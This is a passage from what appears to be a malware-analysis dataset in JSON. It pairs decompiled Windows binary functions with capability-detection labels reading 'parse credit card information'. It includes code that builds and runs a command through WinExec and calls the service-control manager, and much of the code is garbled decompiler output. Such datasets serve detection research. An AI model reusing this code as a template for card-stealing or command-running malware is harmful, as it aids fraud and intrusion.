puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00402ca0(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "004016b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004016b0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uVar2 = fcn.004019f0(uVar1, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar1);\n    return uVar2;\n}\n",
        "token_count": 118
    },
    "00401a80": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004020ae) overlaps instruction at (ram,0x004020ad)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401a80(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    uchar uVar3;\n    code *pcVar4;\n    uint8_t uVar5;\n    int16_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    char *pcVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    char extraout_CL;\n    uint8_t extraout_CL_00;\n    uint16_t extraout_CX;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    ushort extraout_CX_00;\n    char cVar14;\n    uchar *extraout_ECX;\n    uchar *extraout_ECX_00;\n    uchar *extraout_ECX_01;\n    uchar *puVar13;\n    uint32_t extraout_ECX_02;\n    uchar *extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint8_t extraout_DL;\n    uint8_t uVar15;\n    uint8_t extraout_DL_00;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    uint32_t unaff_EBX;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint *unaff_EBP;\n    uchar *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar18;\n    uint *puVar19;\n    ushort in_ES;\n    uint16_t in_SS;\n    uint16_t uVar20;\n    bool bVar21;\n    uchar uVar22;\n    bool bVar23;\n    char cVar24;\n    bool bVar25;\n    char cVar26;\n    ulong uVar27;\n    uchar unaff_retaddr;\n    ushort unaff_retaddr_00;\n    uchar uVar28;\n    uchar uVar29;\n    ushort uVar30;\n    uchar uVar31;\n    uchar uVar32;\n    ushort uVar33;\n    uchar uVar34;\n    uchar uVar35;\n    uint8_t uVar36;\n    uchar uVar37;\n    uchar uVar38;\n    uchar uVar39;\n    uchar uVar40;\n    uchar uVar41;\n    uchar uVar42;\n    uchar uVar43;\n    ushort uVar44;\n    uchar uVar45;\n    \n    uVar45 = unaff_EBX >> 0x18;\n    uVar22 = unaff_ESI >> 0x10;\n    uVar28 = unaff_ESI >> 0x18;\n    uVar30 = SUB42(unaff_EBP, 0);\n    uVar29 = unaff_EBP >> 0x10;\n    uVar31 = unaff_EBP >> 0x18;\n    fcn.00403890(0x407490, 0x11, 0x407024, 10);\n    uVar20 = unaff_ESI;\n    fcn.00403890(0x407490, 0x11, 0x407030, 0x12);\n    bVar21 = false;\n    bVar25 = false;\n    bVar23 = (unaff_ESI & extraout_CX) == 0;\n    uVar40 = 4;\n    uVar41 = 0;\n    uVar42 = 0;\n    uVar43 = 0;\n    uVar38 = 0x44;\n    uVar35 = 0x70;\n    uVar37 = 0x40;\n    uVar39 = 0;\n    uVar33 = 0x11;\n    uVar32 = 0;\n    uVar34 = 0;\n    fcn.00403890(0x407490, 0x11, 0x407044, 4);\n    if ((bVar25) || (!bVar25)) {\n        uVar15 = 0xc;\n        uVar30 = 0x7048;\n        uVar29 = 0x40;\n        uVar31 = 0;\n        uVar20 = 0x11;\n        uVar22 = 0;\n        uVar28 = 0;\n        puVar19 = unaff_EDI;\ncode_r0x00401b16:\n        *(extraout_EDX + 0x11) = *(extraout_EDX + 0x11) + (extraout_ECX >> 8);\n        fcn.00403890(0x407490, CONCAT13(uVar28, CONCAT12(uVar22, uVar20)), CONCAT13(uVar31, CONCAT12(uVar29, uVar30)), \n                     uVar15);\n        uVar16 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n        fcn.00403890(0x407490, 0x11, 0x407054, 7);\n        uVar40 = 0xb;\n        uVar41 = 0;\n        uVar42 = 0;\n        uVar43 = 0;\n        uVar38 = 0x5c;\n        uVar35 = 0x70;\n        uVar37 = 0x40;\n        uVar39 = 0;\n        uVar33 = 0x11;\n        uVar32 = 0;\n        uVar34 = 0;\n    }\n    else {\n        puVar19 = unaff_EDI + 1;\n        uVar3 = in(extraout_EDX);\n        *unaff_EDI = uVar3;\n        uVar16 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (bVar21 || bVar23) {\n            uVar15 = 0x56;\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, 0xbc);\n            if (bVar25) {\n                pcVar4 = swi(1);\n                uVar7 = (*pcVar4)();\n                return uVar7;\n            }\n            goto code_r0x00401b16;\n        }\n    }\n    fcn.00403890(0x407490, CONCAT13(uVar34, CONCAT12(uVar32, uVar33)), \n                 CONCAT13(uVar39, CONCAT12(uVar37, CONCAT11(uVar35, uVar38))), \n                 CONCAT13(uVar43, CONCAT12(uVar42, CONCAT11(uVar41, uVar40))));\n    fcn.00403890(0x407490, 0x11, 0x407068, 0xc);\n    fcn.00403890(0x407490, 0x11, 0x407074, 8);\n    fcn.00403890(0x407490, 0x11, 0x40707c, 0xd);\n    bVar21 = (POPCOUNT(extraout_CL - 5U & 0x44) & 1U) == 0;\n    fcn.00403890(0x407490, 0x11, 0x40708c, 0x18);\n    if ((!bVar21) && (bVar21)) {\n        puVar19 = &stack0xffffffe0;\n        cVar24 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *unaff_EBP;\n            cVar24 = cVar24 + -1;\n        } while ('\\0' < cVar24);\n        uVar7 = in(0x78);\n        return uVar7;\n    }\n    fcn.00403890(0x407490, 0x11, 0x4070a4, 0x25);\n    fcn.00403890(0x407490, 0x11, 0x4070cc, 10);\n    fcn.00403890(0x407490, 0x11, 0x4070d8, 0xc);\n    cVar26 = '\\0';\n    cVar24 = '\\0';\n    bVar21 = (uVar16 & 0x4d) == 0;\n    uVar22 = 0x40;\n    uVar28 = 0;\n    iVar8 = fcn.00403890(0x407490, 0x11, 0x4070e4, 0xd);\n    if ((bVar21 || cVar26 != cVar24) || (!bVar21 && cVar26 == cVar24)) {\n        uVar29 = 6;\n        uVar31 = 0;\n        uVar22 = 0;\n        uVar28 = 0;\n    }\n    else {\n        uVar16 = uVar16 + 1;\n        *(iVar8 + 0x6a39da56) = *(iVar8 + 0x6a39da56) ^ extraout_CL_00;\n        uVar29 = in_ES;\n        uVar31 = in_ES >> 8;\n    }\n    fcn.00403890(0x407490, 0x11, 0x4070f4, CONCAT13(uVar28, CONCAT12(uVar22, CONCAT11(uVar31, uVar29))));\n    fcn.00403890(0x407490, 0x11, 0x4070fc, 5);\n    fcn.00403890(0x407490, 0x11, 0x407104, 0xd);\n    iVar6 = fcn.00403890(0x407490, 0x11, 0x407114, 0x19);\n    bVar21 = false;\n    bVar25 = false;\n    bVar23 = ((puVar19 | 0x74e3) - iVar6 & 0x1a8) == 0;\n    uVar33 = 0x11;\n    uVar29 = 0;\n    uVar31 = 0;\n    uVar30 = 0x7490;\n    uVar22 = 0x40;\n    uVar28 = 0;\n    uVar27 = fcn.00403890(0x407490, 0x11, 0x407130, 0xf);\n    iVar8 = uVar27 >> 0x20;\n    uVar15 = extraout_ECX_00 >> 8;\n    if ((bVar25) || (!bVar25)) {\n        uVar5 = 0xe;\n        goto code_r0x00401ddc;\n    }\n    puVar18 = puVar19 + 1;\n    uVar32 = in(uVar27 >> 0x20);\n    *puVar19 = uVar32;\n    uVar17 = CONCAT31(uVar16 >> 8, 0xbc);\n    if (bVar21 || bVar23) {\n        uVar5 = 0x56;\n        uVar36 = 0;\n        uVar32 = 0;\n        uVar34 = 0;\n        uVar16 = uVar16 & 0xffff0000 | CONCAT11(*extraout_ECX_00, 0xbc);\n        puVar9 = 0x40680e6a;\n        puVar19 = puVar18;\n        if (bVar25) {\ncode_r0x00401ddc:\n            uVar34 = 0;\n            uVar32 = 0;\n            uVar36 = 0;\n            *(iVar8 + 0x11) = *(iVar8 + 0x11) + uVar15;\n            fcn.00403890(0x407490, uVar5, CONCAT13(uVar28, CONCAT12(uVar22, uVar30)), \n                         CONCAT13(uVar31, CONCAT12(uVar29, uVar33)));\n            cVar26 = '\\0';\n            cVar24 = puVar19 < 0;\n            uVar27 = fcn.00403890(0x407490, 0x11, 0x407150, 0xb);\n            iVar8 = uVar27 >> 0x20;\n            puVar9 = uVar27;\n            puVar13 = extraout_ECX_01;\n            puVar18 = puVar19;\n            if ((cVar26 != cVar24) || (puVar13 = extraout_ECX_01 & 0xffff,  cVar26 == cVar24)) {\n                uVar33 = 0xb;\n                uVar29 = 0;\n                uVar31 = 0;\n                uVar30 = 0x715c;\n                uVar22 = 0x40;\n                uVar28 = 0;\n                uVar5 = 0x11;\n                uVar15 = 0;\n                uVar32 = 0;\n                uVar34 = 0;\n                uVar17 = uVar16;\n                goto code_r0x00401e3b;\n            }\n        }\n        else if (!bVar25) {\n            *0x40680e6a = *0x40680e6a + 'j';\n            goto code_r0x00401ddc;\n        }\n        bVar21 = false;\n        bVar25 = false;\n        unaff_EBP = unaff_EBP | *(unaff_ESI + 0x5c);\n        bVar23 = unaff_EBP == NULL;\n        uVar17 = uVar16;\n        unaff_ESI = puVar9;\n        uVar15 = uVar36;\n    }\n    else {\n        uVar16 = uVar27 + 1;\n        uVar5 = uVar16;\n        pcVar10 = (uVar16 & 0xffffff00 | uVar5 + uVar15) - 1;\n        *(uVar17 + 0x665320c4) = *(uVar17 + 0x665320c4) + ((pcVar10 - *pcVar10) - CARRY1(uVar5, uVar15));\n        uVar5 = extraout_ECX_00;\n        uVar32 = extraout_ECX_00 >> 0x10;\n        uVar34 = extraout_ECX_00 >> 0x18;\n        puVar13 = extraout_ECX_00;\ncode_r0x00401e3b:\n        *(iVar8 + 0x11) = *(iVar8 + 0x11) + (puVar13 >> 8);\n        fcn.00403890(0x407490, CONCAT13(uVar34, CONCAT12(uVar32, CONCAT11(uVar15, uVar5))), \n                     CONCAT13(uVar28, CONCAT12(uVar22, uVar30)), CONCAT13(uVar31, CONCAT12(uVar29, uVar33)));\n        uVar16 = fcn.00403890(0x407490, 0x11, 0x407168, 0xb);\n        bVar21 = uVar16 < extraout_ECX_02;\n        bVar25 = SBORROW4(uVar16, extraout_ECX_02);\n        bVar23 = uVar16 == extraout_ECX_02;\n    }\n    uVar44 = 10;\n    uVar40 = 0;\n    uVar41 = 0;\n    uVar33 = 0x7174;\n    uVar37 = 0x40;\n    uVar39 = 0;\n    uVar29 = 0x11;\n    uVar31 = 0;\n    uVar38 = 0;\n    uVar35 = 0;\n    fcn.00403890(0x407490, 0x11, 0x407174, 10);\n    cVar24 = extraout_ECX_03 >> 8;\n    if ((bVar25) || (!bVar25)) {\n        uVar20 = 0xc;\n        uVar30 = 0x7180;\n        uVar22 = 0x40;\n        uVar28 = 0;\n        uVar5 = 0x11;\n        uVar15 = 0;\n        uVar32 = 0;\n        uVar34 = 0;\ncode_r0x00401eb9:\n        *(extraout_EDX_00 + 0x11) = *(extraout_EDX_00 + 0x11) + cVar24;\n        fcn.00403890(0x407490, CONCAT13(uVar34, CONCAT12(uVar32, CONCAT11(uVar15, uVar5))), \n                     CONCAT13(uVar28, CONCAT12(uVar22, uVar30)), uVar20);\n        fcn.00403890(0x407490, 0x11, 0x40718c, 0xe);\n        uVar44 = 0x11;\n        uVar40 = 0;\n        uVar41 = 0;\n        uVar33 = 0x719c;\n        uVar37 = 0x40;\n        uVar39 = 0;\n        uVar29 = 0x11;\n        uVar31 = 0;\n        uVar38 = 0;\n        uVar35 = 0;\n        puVar19 = puVar18;\ncode_r0x00401efe:\n        fcn.00403890(0x407490, CONCAT13(uVar35, CONCAT12(uVar38, CONCAT11(uVar31, uVar29))), \n                     CONCAT13(uVar39, CONCAT12(uVar37, uVar33)), CONCAT13(uVar41, CONCAT12(uVar40, uVar44)));\n        uVar33 = SUB42(puVar19, 0);\n        uVar37 = puVar19 >> 0x10;\n        uVar39 = puVar19 >> 0x18;\n        uVar16 = uVar17;\ncode_r0x00401f1e:\n        uVar17 = uVar16;\n        puVar19 = CONCAT13(uVar39, CONCAT12(uVar37, uVar33));\n        fcn.00403890(0x407490, 0x11, 0x4071b0, 0x13);\n    }\n    else {\n        puVar19 = puVar18 + 1;\n        uVar42 = in(extraout_EDX_00);\n        *puVar18 = uVar42;\n        uVar16 = CONCAT31(uVar17 >> 8, 0xbc);\n        if (!bVar21 && !bVar23) goto code_r0x00401f1e;\n        uVar20 = 0x56;\n        uVar17 = uVar17 & 0xffff0000 | CONCAT11(*extraout_ECX_03, 0xbc);\n        puVar18 = puVar19;\n        if (bVar25) goto code_r0x00401eb9;\n        if (bVar25) {\n            *(extraout_EDX_00 + 0x11) = *(extraout_EDX_00 + 0x11) + cVar24;\n            goto code_r0x00401efe;\n        }\n    }\n    fcn.00403890(0x407490, 0x11, 0x4071c4, 0x14);\n    uVar15 = extraout_DL & uVar17;\n    bVar21 = uVar15 == 0;\n    uVar22 = (POPCOUNT(uVar15) & 1U) == 0;\n    fcn.00403890(0x407490, 0x11, 0x4071d8, 0x33);\n    puVar9 = unaff_ESI;\n    if ((!bVar21) && (bVar21)) {\n        puVar9 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00403890(0x407490, 0x11, 0x40720c, 10);\n    if ((!uVar22) && (uVar22)) {\n        puVar19 = &stack0xffffffd8;\n        cVar24 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *unaff_EBP;\n            cVar24 = cVar24 + -1;\n        } while ('\\0' < cVar24);\n        uVar7 = in(0x78);\n        return uVar7;\n    }\n    uVar22 = 0x74;\n    uVar28 = 0x40;\n    fcn.00403890(0x407490, 0x11, 0x407218, 4);\n    uVar15 = 0;\n    bVar21 = (extraout_CH | extraout_DL_00 | 0x1f) == 0;\n    uVar31 = 0x11;\n    uVar32 = 0;\n    uVar34 = 0;\n    uVar29 = 0;\n    uVar27 = fcn.00403890(0x407490, 0x11, 0x40721c, 5);\n    if ((bVar21) || (!bVar21)) {\ncode_r0x0040203c:\n        puVar1 = (uVar27 >> 0x20) + 6;\n        *puVar1 = *puVar1 ^ extraout_CH_00;\n        fcn.00403890(0x407490, 0x11, 0x407224, CONCAT13(uVar34, CONCAT12(uVar32, CONCAT11(uVar31, uVar29))));\n        fcn.00403890(0x407490, 0x11, 0x407258, 0x2a);\n        uVar7 = fcn.00403890(0x407490, 0x11, 0x407284, 0xb);\n        return uVar7;\n    }\n    uVar7 = in(uVar27 >> 0x20);\n    *puVar19 = uVar7;\n    if (0 < &stack0xffffffec) goto code_r0x0040203c;\n    piVar2 = uVar27 - 0x70;\n    *piVar2 = unaff_EBP + uVar15 + *piVar2;\n    if (*piVar2 != 0) {\n        uVar15 = *(uVar17 + (uVar27 + extraout_CH_00));\n        pcVar10 = uVar27 & 0xffffff00 | uVar15;\n        *pcVar10 = *pcVar10 + uVar15;\n        goto code_r0x0040203c;\n    }\n    fcn.00403890(0x407490, 0x11, 0x40722c, 0xf);\n    fcn.00403890(0x407490, 0x11, 0x40723c, 0x1a);\n    fcn.00403890(0x407490, 0x11, 0x407290, 10);\n    fcn.00403890(0x407490, 0x11, 0x40729c, 0xb);\n    fcn.00403890(0x407490, 0x11, 0x4072a8, 8);\n    bVar21 = false;\n    uVar29 = 0x90;\n    uVar30 = 0x4074;\n    uVar31 = 0;\n    fcn.00403890(0x407490, 0x11, 0x4072b0, 9);\n    if ((!bVar21) && (bVar21)) {\n        uVar7 = CONCAT22(unaff_retaddr_00, CONCAT11(unaff_retaddr, uVar45));\n        *CONCAT13(uVar31, CONCAT21(uVar30, uVar29)) = uVar7;\n        return uVar7;\n    }\n    uVar38 = 9;\n    uVar35 = 0;\n    uVar37 = 0;\n    uVar39 = 0;\n    uVar32 = 0xbc;\n    uVar33 = 0x4072;\n    uVar34 = 0;\n    uVar29 = 0x11;\n    uVar30 = 0;\n    uVar31 = 0;\n    while( true ) {\n        fcn.00403890(0x407490, CONCAT13(uVar31, CONCAT21(uVar30, uVar29)), CONCAT13(uVar34, CONCAT21(uVar33, uVar32)), \n                     CONCAT13(uVar39, CONCAT12(uVar37, CONCAT11(uVar35, uVar38))));\n        uVar16 = CONCAT13(uVar28, CONCAT12(uVar22, in_SS));\n        uVar22 = 0;\n        uVar28 = 0;\n        bVar21 = false;\n        uVar20 = in_SS;\n        puVar11 = fcn.00403890(0x407490, 0x11, 0x4072c8, 0x47);\n        if ((bVar21) || (uVar16 = uVar16 & 0xffff0000 | in_SS,  !bVar21)) break;\n        uVar29 = 0x8b;\n        uVar30 = 0xf8c0;\n        uVar31 = 0xb7;\n        in_SS = uVar20;\n        if (&stack0xffffffbf < *puVar11 || puVar11 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar12 = fcn.00403890(0x407490, 0x11, 0x4072d4, 0xc);\n    bVar21 = false;\n    bVar23 = (uVar16 & uVar12) == 0;\n    uVar22 = 0x90;\n    uVar28 = 0x74;\n    uVar29 = 0x40;\n    uVar31 = 0;\n    fcn.00403890(0x407490, 0x11, 0x4072e0, 3);\n    if ((!bVar21 && !bVar23) && (bVar21 || bVar23)) {\n        puVar9 = CONCAT13(uVar31, CONCAT12(uVar29, CONCAT11(uVar28, uVar22)));\n    }\n    fcn.00403890(0x407490, 0x11, 0x4072e4, 10);\n    fcn.00403890(0x407490, 0x11, 0x4072f0, 0x40);\n    fcn.00403890(0x407490, 0x11, 0x407330, 0xc);\n    uVar28 = 0x3c;\n    uVar29 = 0x73;\n    uVar33 = 0x40;\n    uVar22 = 0x11;\n    uVar5 = 0;\n    uVar30 = 0;\n    fcn.00403890(0x407490, 0x11, 0x40733c, 0x47);\n    fcn.00403890(0x407490, 0x11, 0x407348, 4);\n    iVar6 = fcn.00403890(0x407490, 0x11, 0x40734c, 4);\n    uVar15 = (uVar17 ^ 0x70c5) - iVar6 >> 8 | extraout_CX_00 >> 8;\n    cVar26 = SBORROW1(uVar15, extraout_CX_00);\n    cVar24 = uVar15 - extraout_CX_00 < '\\0';\n    uVar31 = 0x9d;\n    uVar32 = 0x23;\n    fcn.00403890(0x407490, 0x11, 0x407350, 0xc);\n    uVar16 = extraout_ECX_04;\n    if (cVar26 == cVar24) {\n        uVar34 = extraout_ECX_04;\n        uVar38 = extraout_ECX_04 >> 8;\n        uVar16 = extraout_ECX_04 & 0xffff;\n        cVar14 = uVar16 >> 8;\n        if (cVar26 == cVar24) goto code_r0x004023b2;\n        uVar15 = puVar9 + 0x68;\n        if (0x97 < puVar9) goto code_r0x004023b8;\n        iVar8 = extraout_EDX_01;\n        if (-1 < uVar15) {\n            pcVar10 = extraout_EDX_01 + 0x736c6816 + unaff_EBP * 2;\n            *pcVar10 = *pcVar10 + '@' + CARRY1(uVar5, *(puVar9 & 0xffffff00 | uVar15));\n            *(extraout_EDX_01 + 0x11) = *(extraout_EDX_01 + 0x11) + cVar14;\n            goto code_r0x00402408;\n        }\n    }\n    else {\ncode_r0x004023b2:\n        cVar14 = uVar16 >> 8;\n        uVar31 = 4;\n        uVar32 = 0;\n        uVar34 = 0;\n        uVar38 = 0;\n        uVar28 = 0x5c;\n        uVar29 = 0x73;\n        uVar33 = 0x40;\n        uVar22 = 0x11;\n        uVar5 = 0;\n        uVar30 = 0;\ncode_r0x004023b8:\n        *(extraout_EDX_01 + 0x11) = *(extraout_EDX_01 + 0x11) + cVar14;\n        fcn.00403890(0x407490, CONCAT22(uVar30, CONCAT11(uVar5, uVar22)), CONCAT22(uVar33, CONCAT11(uVar29, uVar28)), \n                     CONCAT13(uVar38, CONCAT12(uVar34, CONCAT11(uVar32, uVar31))));\n        iVar8 = extraout_EDX_02;\n    }\n    bVar21 = (POPCOUNT(iVar8 + (iVar8 >> 8)) & 1U) == 0;\n    fcn.00403890(0x407490, 0x11, 0x407360, 9);\n    if ((!bVar21) && (bVar21)) {\n        puVar19 = &stack0xffffffde;\n        cVar24 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar19 = puVar19 + -1;\n            *puVar19 = *unaff_EBP;\n            cVar24 = cVar24 + -1;\n        } while ('\\0' < cVar24);\n        uVar7 = in(0x78);\n        return uVar7;\n    }\n    uVar31 = 0x16;\n    uVar32 = 0;\n    uVar34 = 0;\n    uVar38 = 0;\n    uVar28 = 0x6c;\n    uVar29 = 0x73;\n    uVar33 = 0x40;\n    uVar22 = 0x11;\n    uVar5 = 0;\n    uVar30 = 0;\ncode_r0x00402408:\n    fcn.00403890(0x407490, CONCAT22(uVar30, CONCAT11(uVar5, uVar22)), CONCAT22(uVar33, CONCAT11(uVar29, uVar28)), \n                 CONCAT13(uVar38, CONCAT12(uVar34, CONCAT11(uVar32, uVar31))));\n    uVar7 = fcn.00403890(0x407490, 0x11, 0x407384, 7);\n    return uVar7;\n}\n",
        "token_count": 7102
    },
    "00402450": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004026c7) overlaps instruction at (ram,0x004026c4)\n// \n// WARNING: Removing unreachable block (ram,0x0040249f)\n// WARNING: Removing unreachable block (ram,0x004026c7)\n\nvoid __fastcall fcn.00402450(uint32_t param_1)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint8_t *puVar8;\n    uint8_t extraout_CL;\n    int16_t extraout_CX;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t uVar9;\n    int32_t extraout_ECX_01;\n    ushort extraout_DX;\n    int32_t iVar10;\n    int32_t extraout_EDX;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint unaff_ESI;\n    uint *puVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    uint *puVar13;\n    uint16_t in_ES;\n    uchar uVar14;\n    char cVar15;\n    bool bVar16;\n    bool in_OF;\n    char cVar17;\n    ulong uVar18;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint arg_14h;\n    uint arg_ch;\n    uint arg_10h;\n    uint32_t uVar19;\n    uint in_stack_fffffff0;\n    uint *arg_10h_00;\n    \n    if ((in_OF) || (!in_OF)) {\n        in_stack_fffffff0 = 0x20;\n    }\n    cVar17 = '\\0';\n    cVar15 = (param_1 & *(param_1 + 0x87cb1757)) < 0;\n    arg_10h_00 = unaff_EDI;\n    uVar5 = fcn.00403890(0x407490, 0x11, 0x40738c, in_stack_fffffff0);\n    puVar12 = unaff_EDI;\n    if ((cVar17 == cVar15) && (cVar17 != cVar15)) {\n        out(0xc4, uVar5);\n        puVar12 = unaff_EDI + 1;\n        *unaff_EDI = uVar5;\n    }\n    fcn.00403890(0x407490, 0x11, 0x4073ac, 0x26);\n    bVar16 = false;\n    uVar5 = 0x4024cf;\n    iVar6 = fcn.00403890(0x407490, 0x11, 0x4073d4, 8);\n    if ((bVar16) || (!bVar16)) {\n        uVar5 = 0x19;\n    }\n    puVar7 = iVar6 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    arg_10h = 0x4073dc;\n    arg_ch = 0x11;\n    arg_14h = 0x4024f2;\n    fcn.00403890(0x407490, 0x11, 0x4073dc, uVar5);\n    fcn.00403890(0x407490, 0x11, 0x4073f8, 0xb);\n    fcn.00403890(0x407490, 0x11, 0x407404, 0x12);\n    bVar16 = false;\n    uVar18 = fcn.00403890(0x407490, 0x11, 0x407418, 0x12);\n    iVar10 = uVar18 >> 0x20;\n    if ((bVar16) || (!bVar16)) {\n        uVar5 = 2;\n        arg_10h = 0x40742c;\n        arg_ch = 0x11;\ncode_r0x00402580:\n        *(iVar10 + 0x11) = *(iVar10 + 0x11) + (extraout_ECX >> 8);\n        fcn.00403890(0x407490, arg_ch, arg_10h, uVar5);\n        puVar11 = puVar7;\n        puVar13 = puVar12;\ncode_r0x00402596:\n        cVar3 = fcn.00403890(0x407490, 0x11, 0x407430, 8);\n        cVar17 = '\\0';\n        cVar15 = '\\0';\n        uVar14 = ((extraout_CX + 1U & 0xff | (extraout_CX + 1U >> 8 & cVar3 + 2U) << 8) & 0x7bc9) == 0;\ncode_r0x004025cf:\n        uVar19 = 0x4025e6;\n        iVar6 = fcn.00403890(0x407490, 0x11, 0x407438, 8);\n        if ((uVar14 || cVar17 != cVar15) || (!uVar14 && cVar17 == cVar15)) {\n            uVar19 = 6;\n        }\n        else {\n            *(iVar6 + 0x6a39da56) = *(iVar6 + 0x6a39da56) ^ extraout_CL;\n            uVar19 = uVar19 & 0xffff0000 | in_ES;\n        }\n        fcn.00403890(0x407490, 0x11, 0x407440, uVar19);\n        uVar14 = 0;\n        fcn.00403890(0x407490, 0x11, 0x407448, 7);\ncode_r0x00402642:\n        uVar5 = 0x407490;\n        arg_14h = 0x402655;\n        fcn.00403890(0x407490, 0x11, 0x407450, 7);\n        uVar18 = CONCAT44(extraout_EDX, uVar5);\n        cVar15 = extraout_ECX_01 >> 8;\n        if ((!uVar14) && (uVar14)) {\n            puVar13 = puVar13 ^ *(puVar13 + 0xe58be73);\n            uVar14 = puVar13 == NULL;\n            iVar6 = extraout_ECX_01;\n            goto code_r0x0040266a;\n        }\n        arg_14h = 6;\n        in_stack_ffffffc8 = 0x407458;\n        in_stack_ffffffc4 = 0x11;\n        iVar10 = extraout_EDX;\ncode_r0x0040266c:\n        pcVar1 = iVar10 + 0x11;\n        *pcVar1 = *pcVar1 + cVar15;\n        bVar16 = *pcVar1 == '\\0';\n        fcn.00403890(0x407490, in_stack_ffffffc4, in_stack_ffffffc8, arg_14h);\n        if ((!bVar16) && (bVar16)) {\n            out(*puVar11, extraout_DX);\n        }\n        cVar15 = fcn.00403890(0x407490, 0x11, 0x407460, 0x25);\n        if ((SCARRY4(&stack0xffffffb0, 0x40) != &stack0xfffffff0 < 0) ||\n           (SCARRY4(&stack0xffffffb0, 0x40) == &stack0xfffffff0 < 0)) goto code_r0x004026c2;\n    }\n    else {\n        puVar13 = puVar12 + 1;\n        puVar11 = iVar6 + -0x1bf31dd2;\n        *puVar12 = *puVar7;\n        iVar10 = 0x2c68026a;\n        puVar7 = puVar11;\n        puVar12 = puVar13;\n        uVar5 = extraout_ECX;\n        if (uVar18 != -1) goto code_r0x00402580;\n        *(iVar6 + -0x1bf31d91) = 0;\n        cVar17 = SBORROW4(&stack0xffffffe0, *0x2c68026a);\n        puVar2 = &stack0xffffffe0 + -*0x2c68026a;\n        cVar15 = puVar2 < 0;\n        uVar14 = puVar2 == NULL;\n        bVar16 = (POPCOUNT(puVar2 & 0xff) & 1U) == 0;\n        uVar18 = func_0x81a6e856();\n        iVar6 = extraout_ECX_00 + -1;\n        if (iVar6 != 0 && uVar14 != false) goto code_r0x00402596;\n        if (bVar16) goto code_r0x004025cf;\n        if (!uVar14) {\n            uVar9 = iVar6 >> 8;\n            uVar4 = uVar18 + uVar9;\n            uVar19 = uVar18 & 0xffffff00;\n            uVar4 = uVar4 + *(uVar19 | uVar4) + CARRY1(uVar18, uVar9);\n            puVar8 = uVar19 | uVar4;\n            *puVar13 = *puVar13 + iVar6;\n            *(puVar8 * 2) = iVar6;\n            uVar14 = CARRY1(*puVar8, uVar4);\n            *puVar8 = *puVar8 + uVar4;\n            goto code_r0x00402642;\n        }\ncode_r0x0040266a:\n        iVar10 = uVar18 >> 0x20;\n        cVar15 = iVar6 >> 8;\n        if (!uVar14) goto code_r0x0040266c;\n        cVar15 = uVar18 + '_';\n    }\n    *(puVar13 | unaff_EBP) = cVar15;\ncode_r0x004026c2:\n    fcn.00403890(0x407490, 0x11, arg_10h_00, unaff_ESI);\n    return;\n}\n",
        "token_count": 2301
    },
    "00403890": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
